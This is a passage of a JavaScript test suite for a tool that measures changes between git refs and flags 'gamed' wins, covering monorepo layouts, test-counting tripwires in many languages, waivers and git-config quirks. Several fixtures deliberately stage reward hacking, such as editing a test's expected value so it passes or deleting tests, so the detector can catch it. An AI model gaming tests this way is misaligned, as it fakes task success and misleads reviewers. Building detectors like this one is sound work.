  assert.deepEqual(rep.allowed, { reason: 'the spec changed', cleared: ['tests_pass'] });
  assert.equal(rep.metrics[0].allowed, true); assert.equal(rep.metrics[0].gamed, false); assert.match(rep.metrics[0].gamingReason, /zero production-source files/);
  r = pw(d, [...args, '--markdown']);
  assert.equal(r.code, 0, r.out);
  assert.match(r.out, /Allowed.*tests_pass.*the spec changed/);
  rmSync(d, { recursive: true, force: true });
});

test('self-heal: a registered worktree a killed run left behind is removed once it is a day old; a younger one is left alone', () => {
  const tmp = mkdtempSync(join(tmpdir(), 'pw-heal-'));
  const d = tmpRepo([TODOS]);
  writeFileSync(join(d, 'app.js'), 'a\n'); commitAll(d, 'base');
  const killed = join(tmp, `promptwheel-${ownerTag(d)}-KILLED`);
  const live = join(tmp, `promptwheel-src-${ownerTag(d)}-LIVE01`);
  for (const p of [killed, live]) execFileSync('git', ['worktree', 'add', '--quiet', '--detach', p, 'HEAD'], { cwd: d });
  const day = new Date(Date.now() - 90_000_000), old = new Date(Date.now() - 7200_000);
  utimesSync(killed, day, day); utimesSync(live, old, old);
  pwTmp(tmp, d, ['run', '--working']);
  const listed = execFileSync('git', ['worktree', 'list', '--porcelain'], { cwd: d, encoding: 'utf8' });
  assert.equal(existsSync(killed), false, 'the day-old worktree is gone from disk');
  assert.doesNotMatch(listed, /-KILLED$/m, 'and from the registry');
  assert.match(listed, /-LIVE01$/m, 'the younger one is still registered');
  assert.equal(existsSync(live), true, 'a registered worktree under a day old may still be measuring');
  execFileSync('git', ['worktree', 'remove', '--force', live], { cwd: d });
  for (const p of [tmp, d]) rmSync(p, { recursive: true, force: true });
});

// ---- a workspaces repo, as an outside field report hit it on 0.1.44: the check linked only the root node_modules,
// so a test that needed a workspace's own dependencies could not run, and nothing was measured
function monoRepo({ pnpm = false } = {}) {
  const d = mkdtempSync(join(tmpdir(), 'pw-mono-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  const put = (f, c) => { mkdirSync(dirname(join(d, f)), { recursive: true }); writeFileSync(join(d, f), c); };
  put('.gitignore', 'node_modules\n.promptwheel/\n');
  put('package.json', JSON.stringify({ name: 'mono', private: true, version: '1.0.0', workspaces: ['apps/*', 'packages/*'], scripts: { test: 'node --test' } }));
  put('apps/web/package.json', '{"name":"web","version":"1.0.0"}');
  put('packages/util/package.json', '{"name":"@x/util","version":"1.0.0","main":"index.js"}');
  put('packages/util/index.js', 'exports.add=(a,b)=>a-b\n');
  // one outside dependency in the root, and one only the web workspace has
  put('node_modules/rootdep/package.json', '{"name":"rootdep","version":"1.0.0","main":"index.js"}'); put('node_modules/rootdep/index.js', 'module.exports=(x)=>x\n');
  put('apps/web/node_modules/localdep/package.json', '{"name":"localdep","version":"1.0.0","main":"index.js"}'); put('apps/web/node_modules/localdep/index.js', 'module.exports=(x)=>x\n');
  // the link to the sibling package: npm and yarn put it in the root, pnpm in the workspace that depends on it
  const at = pnpm ? 'apps/web/node_modules/@x' : 'node_modules/@x';
  mkdirSync(join(d, at), { recursive: true }); symlinkSync(pnpm ? '../../../../packages/util' : '../../packages/util', join(d, at, 'util'));
  put('apps/web/src/sum.js', "const id=require('localdep'),root=require('rootdep');const {add}=require('@x/util');exports.sum=(a,b)=>root(id(add(a,b)))\n");
  put('apps/web/test/sum.test.js', "require('node:test').test('sum',()=>require('node:assert').equal(require('../src/sum.js').sum(2,3),5))\n");
  commitAll(d, 'base: add subtracts');
  return { d, put };
}
const runJson = (d, ...extra) => { const r = spawnSync('node', [ENGINE, 'run', '--base', 'HEAD~1', '--head', 'HEAD', '--json', '--no-record', ...extra], { cwd: d, encoding: 'utf8' }); return { code: r.status, rep: JSON.parse(r.stdout) }; };
for (const pnpm of [false, true]) {
  test(`measure env: with no config, a workspaces repo is measured (${pnpm ? 'pnpm' : 'npm and yarn'} layout): the workspace's own dependencies resolve, and a sibling package is read at the ref being measured`, () => {
    const { d, put } = monoRepo({ pnpm });
    put('packages/util/index.js', 'exports.add=(a,b)=>a+b\n'); commitAll(d, 'fix add, in the sibling package');
    const { code, rep } = runJson(d);
    const m = rep.metrics.find((x) => x.name === 'tests_pass');
    assert.equal(m.before, 0, 'the base ref is measured with the base ref\'s sibling package, not the working tree\'s');
    assert.equal(m.after, 1);
    assert.equal(rep.verdict, 'pass'); assert.equal(code, 0); assert.ok(!m.inert);
    rmSync(d, { recursive: true, force: true });
  });
}
test('measure env: a regression in a sibling package is seen, not hidden by reading the working tree at both refs', () => {
  const { d, put } = monoRepo();
  put('packages/util/index.js', 'exports.add=(a,b)=>a+b\n'); commitAll(d, 'good');
  put('packages/util/index.js', 'exports.add=(a,b)=>a*b\n'); commitAll(d, 'break add');
  const { code, rep } = runJson(d);
  const m = rep.metrics.find((x) => x.name === 'tests_pass');
  assert.equal(m.before, 1); assert.equal(m.after, 0);
  assert.equal(rep.verdict, 'fail'); assert.equal(code, 1);
  rmSync(d, { recursive: true, force: true });
});
// found by replaying real commits (proof-bench/replay): micromark's build runs micromark-build, a workspace package of
// its own, through node_modules/.bin. That folder was one link to the working tree's, so the tool ran from the working
// tree at both refs, and in a fresh clone (nothing built there yet) no commit could be measured.
test('measure env: a workspace package\'s own executable runs from the ref being measured, not from the working tree', () => {
  const { d, put } = monoRepo();
  put('packages/tool/package.json', '{"name":"tool","version":"1.0.0","bin":{"tool":"cli.js"}}');
  put('packages/tool/cli.js', '#!/usr/bin/env node\nconsole.log(1)\n'); chmodSync(join(d, 'packages/tool/cli.js'), 0o755);
  symlinkSync('../packages/tool', join(d, 'node_modules/tool'));
  mkdirSync(join(d, 'node_modules/.bin'), { recursive: true }); symlinkSync('../tool/cli.js', join(d, 'node_modules/.bin/tool'));
  // an outside tool beside it keeps working
  put('node_modules/outside/cli.js', '#!/usr/bin/env node\nconsole.log(7)\n'); chmodSync(join(d, 'node_modules/outside/cli.js'), 0o755); symlinkSync('../outside/cli.js', join(d, 'node_modules/.bin/outside'));
  put('promptwheel.config.json', JSON.stringify({ metrics: [{ name: 'tool_says', cmd: 'node_modules/.bin/tool', extract: 'number', direction: 'up' }, { name: 'outside_says', cmd: 'node_modules/.bin/outside', extract: 'number', direction: 'up' }] }));
  commitAll(d, 'a tool that says 1');
  put('packages/tool/cli.js', '#!/usr/bin/env node\nconsole.log(2)\n'); commitAll(d, 'the tool says 2');
  const { rep } = runJson(d);
  const m = rep.metrics.find((x) => x.name === 'tool_says');
  assert.equal(m.before, 1, 'the base ref runs the base ref\'s tool, not the working tree\'s'); assert.equal(m.after, 2);
  assert.equal(rep.metrics.find((x) => x.name === 'outside_says').after, 7, 'a tool from outside the repo still runs');
  rmSync(d, { recursive: true, force: true });
});
// A LIMIT, pinned so it is known: an outside dependency lives in the real node_modules, and Node resolves what it
// imports from its real folder. So a workspace package it imports is the working tree's copy, at both refs. micromark's
// tests reach micromark itself this way, through mdast-util-from-markdown.
test('LIMIT measure env: a dependency from outside the repo that imports a workspace package reads the working tree\'s copy, not the ref\'s', () => {
  const { d, put } = monoRepo();
  put('node_modules/outside/package.json', '{"name":"outside","version":"1.0.0","main":"index.js"}');
  put('node_modules/outside/index.js', "module.exports=(a,b)=>require('@x/util').add(a,b)\n");   // an outside package that imports the sibling
  put('promptwheel.config.json', JSON.stringify({ metrics: [{ name: 'through_outside', cmd: "node -e \"console.log(require('outside')(2,3))\"", extract: 'number', direction: 'up' }] }));
  put('packages/util/index.js', 'exports.add=(a,b)=>a+b\n'); commitAll(d, 'add gives 5');
  put('packages/util/index.js', 'exports.add=(a,b)=>a*b\n'); commitAll(d, 'add gives 6');
  const m = runJson(d).rep.metrics.find((x) => x.name === 'through_outside');
  assert.equal(m.before, 6, 'the base ref should read 5; through the outside package it reads the working tree (6)'); assert.equal(m.after, 6);
  rmSync(d, { recursive: true, force: true });
});
test('measure env: a single-package repo keeps one link for node_modules; a workspaces repo gets its own folder, so a test cannot write into the real one', () => {
  const probe = [{ name: 'nm_is_link', cmd: '[ -L node_modules ] && echo 1 || echo 0', extract: 'number', direction: 'up' },
    { name: 'writes', cmd: 'touch node_modules/.made-by-a-test 2>/dev/null; echo 1', extract: 'number', direction: 'up' }];
  const single = mkdtempSync(join(tmpdir(), 'pw-single-'));
  const g = (a) => execFileSync('git', a, { cwd: single });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  writeFileSync(join(single, '.gitignore'), 'node_modules\n.promptwheel/\n'); mkdirSync(join(single, 'node_modules/dep'), { recursive: true }); writeFileSync(join(single, 'node_modules/dep/index.js'), '');
  writeFileSync(join(single, 'promptwheel.config.json'), JSON.stringify({ metrics: probe })); writeFileSync(join(single, 'a.txt'), '1'); commitAll(single, 'a'); writeFileSync(join(single, 'a.txt'), '2'); commitAll(single, 'b');
  assert.equal(runJson(single).rep.metrics.find((x) => x.name === 'nm_is_link').after, 1);
  const { d, put } = monoRepo();
  put('promptwheel.config.json', JSON.stringify({ metrics: probe })); commitAll(d, 'cfg'); put('a.txt', '2'); commitAll(d, 'b');
  assert.equal(runJson(d).rep.metrics.find((x) => x.name === 'nm_is_link').after, 0);
  assert.ok(!existsSync(join(d, 'node_modules/.made-by-a-test')), 'the real node_modules is untouched');
  rmSync(single, { recursive: true, force: true }); rmSync(d, { recursive: true, force: true });
});

// ---- found by running real repos (proof-bench/field, vuejs/pinia): pnpm keeps a state folder in node_modules and refuses
// to use it, or node_modules itself, through a symlink, so its scripts failed at once in the clean copy
test('measure env: a pnpm repo gets a real node_modules folder, and a tool\'s own state folder is not linked into it', () => {
  const probe = [{ name: 'nm_is_link', cmd: '[ -L node_modules ] && echo 1 || echo 0', extract: 'number', direction: 'up' },
    { name: 'state_is_link', cmd: '[ -L node_modules/.pnpm-task-run-state-v1 ] && echo 1 || echo 0', extract: 'number', direction: 'up' },
    { name: 'cache_is_link', cmd: '[ -L node_modules/.cache ] && echo 1 || echo 0', extract: 'number', direction: 'up' },
    { name: 'bin_works', cmd: '[ -x node_modules/.bin/tool ] && echo 1 || echo 0', extract: 'number', direction: 'up' },
    { name: 'store_works', cmd: 'node -e "console.log(require(\'dep\'))"', extract: 'number', direction: 'up' }];
  const d = mkdtempSync(join(tmpdir(), 'pw-pnpm-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  const put = (f, c, mode) => { mkdirSync(dirname(join(d, f)), { recursive: true }); writeFileSync(join(d, f), c, mode ? { mode } : undefined); };
  put('.gitignore', 'node_modules\n.promptwheel/\n');
  // one package, laid out the way pnpm does it: the store under .pnpm, the package a link into it, and pnpm's state
  put('node_modules/.pnpm/dep@1.0.0/node_modules/dep/index.js', 'module.exports = 7\n');
  symlinkSync('.pnpm/dep@1.0.0/node_modules/dep', join(d, 'node_modules/dep'));
  put('node_modules/.modules.yaml', 'layoutVersion: 5\n'); put('node_modules/.pnpm-task-run-state-v1/x.json', '{}'); put('node_modules/.cache/y', 'y'); put('node_modules/.bin/tool', '#!/bin/sh\n', 0o755);
  put('promptwheel.config.json', JSON.stringify({ metrics: probe })); put('a.txt', '1'); commitAll(d, 'a'); put('a.txt', '2'); commitAll(d, 'b');
  const after = Object.fromEntries(runJson(d).rep.metrics.map((m) => [m.name, m.after]));
  assert.deepEqual(after, { nm_is_link: 0, state_is_link: 0, cache_is_link: 0, bin_works: 1, store_works: 7 });
  rmSync(d, { recursive: true, force: true });
});

// ---- the same report: signing moved test_count by 37, the matches inside the tool's own copied scanners
test('init: every counting tripwire leaves out the tool\'s own .promptwheel folder, so installing the tool does not move its own baseline', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-tripwire-'));
  execFileSync('git', ['init', '-q'], { cwd: d });
  writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'x', scripts: { test: 'node --test' } }));
  mkdirSync(join(d, 'test')); writeFileSync(join(d, 'test/a.test.js'), "test('a', () => { expect(1) })\n");
  assert.equal(pw(d, ['init', '--no-agent-block']).code, 0);
  const cfg = JSON.parse(readFileSync(join(d, 'promptwheel.config.json'), 'utf8'));
  const count = (name) => +execFileSync('sh', ['-c', cfg.metrics.find((m) => m.name === name).cmd], { cwd: d, encoding: 'utf8' }).trim();
  const names = ['test_count', 'skipped_tests', 'suppressions', 'assertions'];
  const was = names.map(count);
  mkdirSync(join(d, '.promptwheel/packs/x'), { recursive: true });
  writeFileSync(join(d, '.promptwheel/packs/x/scan.mjs'), "test('t', () => {}); it('i', () => {}); describe('d', () => {}); it.skip('s'); expect(1); assert(1) // eslint-disable\n");
  assert.deepEqual(names.map(count), was);
  rmSync(d, { recursive: true, force: true });
});

// ---- found by replaying the contract on 408 real pull requests (proof-bench/outside-repos, 2026-11-18): a docs-only
// change was sent back for "fewer tests" (the words "it (" in a sentence), a removed dependency for "fewer assertions"
// (the word assert in yarn.lock), and zod's .describe( and a regex's .test( were counted as tests
const tripwires = (files) => {
  const d = mkdtempSync(join(tmpdir(), 'pw-tripwire-'));
  execFileSync('git', ['init', '-q'], { cwd: d });
  writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'x', scripts: { test: 'node --test' } }));
  mkdirSync(join(d, 'test')); writeFileSync(join(d, 'test/a.test.js'), "test('a', () => { expect(1) })\n");
  assert.equal(pw(d, ['init', '--no-agent-block']).code, 0);
  const cfg = JSON.parse(readFileSync(join(d, 'promptwheel.config.json'), 'utf8'));
  const names = ['test_count', 'skipped_tests', 'suppressions', 'assertions'];
  const counts = () => names.map((name) => +execFileSync('sh', ['-c', cfg.metrics.find((m) => m.name === name).cmd], { cwd: d, encoding: 'utf8' }).trim());
  const was = counts();
  for (const [f, text] of Object.entries(files)) { mkdirSync(dirname(join(d, f)), { recursive: true }); writeFileSync(join(d, f), text); }
  const now = counts();
  rmSync(d, { recursive: true, force: true });
  return now.map((n, i) => n - was[i]);   // [tests, skipped, silenced, assertions] added by the files
};
test('init: the counting tripwires read code, not prose, lock files or data', () => {
  assert.deepEqual(tripwires({
    'docs/notes.md': "We ran it (twice) and test (the build) again. expect (nothing) here; assert that it('x') holds. // eslint-disable\n",
    'README.rst': "describe (the thing) and test('it')\n",
    'yarn.lock': '"assert@npm:^2.0.0":\n  version: 2.1.0\n  resolution: "assert@npm:2.1.0"\n',
    'package-lock.json': '{"packages":{"node_modules/assert":{"version":"2.1.0"},"node_modules/expect":{}}}\n',
    'locales/en.yml': 'hint: "press it (twice) to test (again), then assert"\n',
    'data/notes.json': '{"note":"expect (this): it (works)"}\n',
  }), [0, 0, 0, 0]);
});
test('init: a member call is not a test; a tap, Deno or QUnit test is', () => {
  assert.deepEqual(tripwires({
    'src/schema.js': "export const s = z.string().describe('a name');\nexport const ok = (v) => /^a/.test(v);\npage.it(1); suite.describe('x');\n",
  }), [0, 0, 0, 0], 'zod .describe( and a regex .test( are not tests');
  assert.deepEqual(tripwires({
    'test/more.test.js': "t.test('sub', (t) => { t.equal(1, 1); t.end() })\nDeno.test('d', () => {})\nQUnit.test('q', () => {})\ndescribe('g', () => { it('i', () => {}); test('t', () => {}) })\nit.skip('s', () => {}); xtest('x', () => {})\n",
  }), [6, 2, 0, 1], 'three member-call tests the frameworks define, a group, two tests; two skipped; one tap assertion');
});
test('init: the counting tripwires read Go, Rust, Ruby, Java, C#, Elixir, Swift and Python tests', () => {
  const each = {
    go: [{ 'add_test.go': 'func TestAdd(t *testing.T) {\n\tif add(1, 2) != 3 {\n\t\tt.Errorf("no")\n\t}\n}\nfunc (s *Suite) TestSub() { require.Equal(s.T(), 1, 1) }\nfunc TestLater(t *testing.T) { t.Skip("later") }\nfunc testHelper() {}\n' }, [3, 1, 0, 2]],
    rust: [{ 'src/lib.rs': '#[cfg(test)]\nmod tests {\n    #[test]\n    fn adds() { assert_eq!(1 + 1, 2); }\n    #[tokio::test]\n    async fn waits() { assert!(true); }\n    #[test]\n    #[ignore]\n    fn later() {}\n}\n' }, [3, 1, 0, 2]],
    ruby: [{ 'spec/a_spec.rb': "describe 'A' do\n  it 'adds' do\n    expect(1 + 1).to eq 2\n  end\n  xit 'later' do\n  end\n  it { is_expected.to be_nil }\nend\n" }, [2, 1, 0, 1]],
    java: [{ 'src/test/java/ATest.java': 'class ATest {\n  @Test\n  void adds() { assertEquals(2, 1 + 1); }\n  @Test\n  @Disabled\n  void later() {}\n}\n' }, [2, 1, 0, 1]],
    csharp: [{ 'tests/ATests.cs': 'public class ATests {\n  [Fact]\n  public void Adds() { Assert.Equal(2, 1 + 1); }\n  [Fact(Skip = "later")]\n  public void Later() {}\n  [Theory]\n  public void Many(int a) { Assert.True(a > 0); }\n}\n' }, [3, 1, 0, 2]],
    elixir: [{ 'test/a_test.exs': 'test "adds" do\n  assert 1 + 1 == 2\nend\n' }, [1, 0, 0, 1]],
    swift: [{ 'Tests/ATests.swift': '@Test func adds() { #expect(1 + 1 == 2) }\nfunc old() { XCTAssertEqual(1, 1) }\n' }, [1, 0, 0, 2]],
    python: [{ 'tests/test_a.py': 'import pytest\n\ndef test_adds():\n    assert 1 + 1 == 2\n\n@pytest.mark.xfail\ndef test_later():\n    assert False\n' }, [2, 1, 0, 2]],
  };
  for (const [lang, [files, want]] of Object.entries(each)) assert.deepEqual(tripwires(files), want, `${lang}: [tests, skipped, silenced, assertions]`);
});

// ---- the verdict for whoever repairs it, a person or a fix run. Found by reading how agent pipelines are built
// (proof-bench/outside-repos, section 8): most merged agent pull requests carry no word from a person, and a reject
// that names its cause is what a fix run acts on. Until now a fall in tests said neither where nor what to do.
const fallRepo = (allowable) => {
  const d = mkdtempSync(join(tmpdir(), 'pw-fall-'));
  for (const a of [['init', '-q'], ['config', 'user.name', 't'], ['config', 'user.email', 't@t'], ['config', 'commit.gpgsign', 'false']]) execFileSync('git', a, { cwd: d });
  writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'x', scripts: { test: 'node --test' } }));
  mkdirSync(join(d, 'test'));
  writeFileSync(join(d, 'test/a.test.js'), "const t = require('node:test');\nt.test('add', () => {});\nt.test('sub', () => {});\n");
  writeFileSync(join(d, 'test/b.test.js'), "const t = require('node:test');\nt.test('mul', () => {});\n");
  assert.equal(pw(d, ['init', '--no-agent-block']).code, 0);
  const f = join(d, 'promptwheel.config.json'); const c = JSON.parse(readFileSync(f, 'utf8'));
  c.metrics = c.metrics.filter((m) => ['test_count', 'skipped_tests', 'assertions'].includes(m.name)).map((m) => ({ ...m, allowable }));
  writeFileSync(f, JSON.stringify(c, null, 2)); commitAll(d, 'the contract');
  return d;
};
const ONE_TEST = "const t = require('node:test');\nt.test('add', () => {});\n";
test('run: a fall in a counting tripwire says which file, and the two ways out', () => {
  let d = fallRepo('flag');
  writeFileSync(join(d, 'test/a.test.js'), ONE_TEST); commitAll(d, 'drop the sub test');
  const r = runJson(d);
  assert.equal(r.code, 1);
  assert.deepEqual(r.rep.metrics.find((x) => x.name === 'test_count').where, [{ file: 'test/a.test.js', before: 2, after: 1 }]);
  assert.equal(r.rep.byCommit, undefined, 'this contract takes no reason from a commit');
  let out = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record']).out;
  assert.match(out, /fewer tests: 3 → 2, in test\/a\.test\.js \(2 → 1\)/);
  assert.match(out, /1\. put back what was removed, and push/);
  assert.match(out, /2\. if removing it is the job, a person gives the reason: promptwheel run --allow "<reason>"/);
  assert.doesNotMatch(out, /Promptwheel-Allow: test_count/);
  let md = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--markdown']).out;
  assert.match(md, /\*\*Where:\*\* `test\/a\.test\.js` \(2 → 1\)/); assert.match(md, /Put back what was removed, and push/);
  assert.match(md, /someone with write access who did not open this PR comments `sawbuck-allow: <their reason>`/);
  rmSync(d, { recursive: true, force: true });
  d = fallRepo(true);
  writeFileSync(join(d, 'test/a.test.js'), ONE_TEST); commitAll(d, 'drop the sub test');
  assert.deepEqual(runJson(d).rep.byCommit, ['test_count']);
  out = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record']).out;
  assert.match(out, /2\. only if what it tested was itself removed on purpose, end a commit message in this change with the line\n\s+Promptwheel-Allow: test_count: <what was removed, and who asked for it>/);
  assert.match(out, /a test that fails on the new code is not a reason to remove it/);
  assert.match(out, /3\. if neither can be done honestly, stop: leave the pull request red and say why/);
  md = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--markdown']).out;
  assert.match(md, /`Promptwheel-Allow: test_count: <what was removed, and who asked for it>`/); assert.doesNotMatch(md, /sawbuck-allow: <their reason>/);
  rmSync(d, { recursive: true, force: true });
});
test('run: where the contract takes a reason from a commit, any commit of the change may carry it', () => {
  const twoCommits = (d) => {
    writeFileSync(join(d, 'test/a.test.js'), ONE_TEST);
    execFileSync('git', ['commit', '-qam', 'drop the sub test\n\nPromptwheel-Allow: test_count: the rule it checked went'], { cwd: d });
    writeFileSync(join(d, 'notes.txt'), 'later\n'); commitAll(d, 'a later commit that says nothing');
    const r = spawnSync('node', [ENGINE, 'run', '--base', 'HEAD~2', '--head', 'HEAD', '--json', '--no-record'], { cwd: d, encoding: 'utf8' });
    return { code: r.status, rep: JSON.parse(r.stdout) };
  };
  let d = fallRepo(true);
  let r = twoCommits(d);
  assert.equal(r.code, 0, JSON.stringify(r.rep.allowed));
  assert.ok(r.rep.allowed.cleared.includes('test_count')); assert.match(r.rep.allowed.reason, /the rule it checked went/);
  rmSync(d, { recursive: true, force: true });
  d = fallRepo('flag');
  r = twoCommits(d);
  assert.equal(r.code, 1, 'a contract that asks a person takes no reason from any commit');
  rmSync(d, { recursive: true, force: true });
});

// ---- the same report: one message for a red suite, a failed setup and a missing dependency, and setup output thrown away
test('run: a setup that fails is named in the report with its exit code and last line, at each ref it failed', () => {
  const d = tmpRepo([{ name: 'ok', cmd: 'true', extract: 'exit', direction: 'pass', guard: true }]);
  const f = join(d, 'promptwheel.config.json');
  writeFileSync(f, JSON.stringify({ ...JSON.parse(readFileSync(f, 'utf8')), setup: 'echo building; echo "boom: missing compiler" >&2; exit 7' }));
  writeFileSync(join(d, 'a.txt'), '1'); commitAll(d, 'a'); writeFileSync(join(d, 'a.txt'), '2'); commitAll(d, 'b');
  const { rep } = runJson(d);
  assert.deepEqual(rep.setup, { base: { exit: 7, lastLine: 'boom: missing compiler' }, head: { exit: 7, lastLine: 'boom: missing compiler' } });
  assert.match(pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record']).out, /setup failed \(exit 7\)[^\n]*boom: missing compiler/);
  writeFileSync(f, JSON.stringify({ ...JSON.parse(readFileSync(f, 'utf8')), setup: 'true' })); commitAll(d, 'setup works');
  writeFileSync(join(d, 'a.txt'), '3'); commitAll(d, 'c');
  assert.equal(runJson(d).rep.setup, undefined, 'no setup field when setup worked');
  rmSync(d, { recursive: true, force: true });
});
test('run: a test metric that fails at both refs says whether a dependency is missing or the tests just fail', () => {
  const mk = (testBody) => {
    const d = mkdtempSync(join(tmpdir(), 'pw-cause-'));
    const g = (a) => execFileSync('git', a, { cwd: d });
    g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
    writeFileSync(join(d, '.gitignore'), '.promptwheel/\n');
    writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'x', version: '1.0.0', scripts: { test: 'node --test' } }));
    mkdirSync(join(d, 'test')); writeFileSync(join(d, 'test/a.test.js'), testBody); commitAll(d, 'a');
    writeFileSync(join(d, 'note.txt'), 'x'); commitAll(d, 'b');
    const m = runJson(d).rep.metrics.find((x) => x.name === 'tests_pass');
    rmSync(d, { recursive: true, force: true });
    return m;
  };
  const missing = mk("const dep = require('a-package-nobody-installed');\nrequire('node:test').test('t', () => dep());\n");
  assert.equal(missing.inert, true); assert.equal(missing.cause, 'missing-dependency'); assert.match(missing.detail, /a-package-nobody-installed/);
  const red = mk("require('node:test').test('t', () => require('node:assert').equal(1, 2));\n");
  assert.equal(red.inert, true); assert.equal(red.cause, 'failing');
});
// A script that dies on a failed ES module import prints the source line `throw new ERR_MODULE_NOT_FOUND(` first and
// the line that names the file after it. The hint is the line that names it: on micromark it read
// "ERR_MODULE_NOT_FOUND(" and nothing else.
test('run: the missing-dependency hint names the file, not the bare error code above it', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-esm-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  writeFileSync(join(d, '.gitignore'), '.promptwheel/\n');
  writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'x', version: '1.0.0', type: 'module', scripts: { test: 'node run.mjs' } }));
  writeFileSync(join(d, 'run.mjs'), "import './not-here.mjs';\n"); commitAll(d, 'a');
  writeFileSync(join(d, 'note.txt'), 'x'); commitAll(d, 'b');
  const m = runJson(d).rep.metrics.find((x) => x.name === 'tests_pass');
  assert.equal(m.cause, 'missing-dependency');
  // the hint is cut at 200 characters, and where the temp folder's path is long (a Mac's, a sandbox's) the cut falls
  // before the importing file. The file that is missing comes first, and that is what the hint is for.
  assert.match(m.detail, /^Cannot find module .*not-here\.mjs/, m.detail);
  rmSync(d, { recursive: true, force: true });
});

// ---- found by running real repos (proof-bench/field): tap prints every assertion when its output is a pipe, more than
// the 1 MB the engine would take, so a passing suite was killed and read as failing at both refs
test('run: a test command that passes while printing megabytes of output is measured as passing', () => {
  const d = tmpRepo([{ name: 'tests_pass', cmd: 'node -e "process.stdout.write(Buffer.alloc(3 * 1024 * 1024, 120).toString())"', extract: 'exit', direction: 'pass', guard: true }]);
  writeFileSync(join(d, 'a.txt'), '1'); commitAll(d, 'a'); writeFileSync(join(d, 'a.txt'), '2'); commitAll(d, 'b');
  const { code, rep } = runJson(d);
  const m = rep.metrics[0];
  assert.equal(m.before, 1); assert.equal(m.after, 1); assert.ok(!m.inert); assert.equal(code, 0);
  rmSync(d, { recursive: true, force: true });
});

// ---- the same report: on 0.7.16 --allow turned "could not measure" into exit 0
test('run: --allow does not turn an inconclusive result into a pass: a waiver overrides a verdict, not the lack of one', () => {
  const d = tmpRepo([{ name: 'tests_pass', cmd: 'false', extract: 'exit', direction: 'pass', guard: true }]);
  writeFileSync(join(d, 'a.txt'), '1'); commitAll(d, 'a'); writeFileSync(join(d, 'a.txt'), '2'); commitAll(d, 'b');
  assert.equal(pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record']).code, 3);
  const r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--allow', 'ship it']);
  assert.equal(r.code, 3, r.out);
  assert.doesNotMatch(r.out, /VERDICT: PASS/);
  rmSync(d, { recursive: true, force: true });
});

test('a test that prints an HTTP "Not found" is not read as a missing dependency; a shell "command not found" still is', async () => {
  const { MISSING_DEP } = await import('../bin/promptwheel.mjs');
  for (const t of ['#   Error: Not found', 'GET /users/9 404 Not found', 'expected "Not found" to equal "OK"']) assert.ok(!MISSING_DEP.test(t), t);
  for (const t of ['sh: 1: jest: not found', '/bin/sh: 1: vitest: not found', 'bash: tsc: command not found', "Error: Cannot find module 'left-pad'"]) assert.ok(MISSING_DEP.test(t), t);
});


// ---------------------- a person's own git settings, and file names git quotes
// Every suite and every release check ran with a blank git config, so the engine had never met a ~/.gitconfig with a
// line in it. Found 2026-11-15 on the published 0.8.9 (proof-bench/own-git): with diff.noprefix, an outside diff tool,
// colour forced on or no context lines, the source-only patch did not apply. An honest fix then read "inconclusive",
// and a gamed win with a source file touched was not sent back. A setting in the repo's own config reads the same to git.
const ownGitRepo = (settings = [], src = 'calc.mjs', tst = 'calc.test.mjs') => {
  const d = tmpRepo([{ name: 'tests_pass', cmd: `node --test "${tst}" 2>&1`, extract: 'exit', direction: 'pass', guard: true }]);
  for (const [k, v] of settings) execFileSync('git', ['config', k, v], { cwd: d });
  for (const f of [src, tst]) mkdirSync(join(d, dirname(f)), { recursive: true });
  const up = dirname(tst) === '.' ? './' : '../'.repeat(tst.split('/').length - 1);
  const testOf = (want) => `import { test } from 'node:test'; import assert from 'node:assert'; import { sub } from '${up}${src}'; test('sub', () => assert.strictEqual(sub(5, 3), ${want}));\n`;
  writeFileSync(join(d, src), 'export const sub = (a, b) => a + b;\n');   // the bug: it should be a - b
  writeFileSync(join(d, tst), testOf(2)); commitAll(d, 'base: red test, buggy source');
  return {
    d,
    fix: () => { writeFileSync(join(d, src), 'export const sub = (a, b) => a - b;\n'); commitAll(d, 'fix the source'); },
    game: () => { writeFileSync(join(d, tst), testOf(8)); writeFileSync(join(d, src), 'export const sub = (a, b) => a + b;\nexport const twice = (a) => a * 2;\n'); commitAll(d, 'edit the test to pass, and touch the source'); },
    report: () => check({ repo: d, base: 'HEAD~1', head: 'HEAD' }),
  };
};
for (const [k, v] of [['diff.noprefix', 'true'], ['diff.mnemonicPrefix', 'true'], ['color.ui', 'always'], ['color.diff', 'always'], ['diff.context', '0'], ['diff.external', 'no-such-diff-tool'], ['diff.renames', 'copies'], ['core.abbrev', '4']]) {
  test(`own git: with ${k}=${v} an honest fix reads pass, and a gamed win that also touches a source file reads gamed`, () => {
    const a = ownGitRepo([[k, v]]); a.fix(); assert.equal(a.report().verdict, 'pass', 'the honest fix');
    const b = ownGitRepo([[k, v]]); b.game(); assert.equal(b.report().verdict, 'gamed', 'the gamed win');
    rmSync(a.d, { recursive: true, force: true }); rmSync(b.d, { recursive: true, force: true });
  });
}
// Git prints a name that holds a byte above 127, a double quote, a backslash or a tab inside quotes with the bytes
// escaped ("src/a\303\261adir.mjs") unless it is asked for the names NUL-separated. Read as a line, that string is no
// file: it matched no pathspec, so the source-only patch was empty and an honest fix in such a file read "gamed".
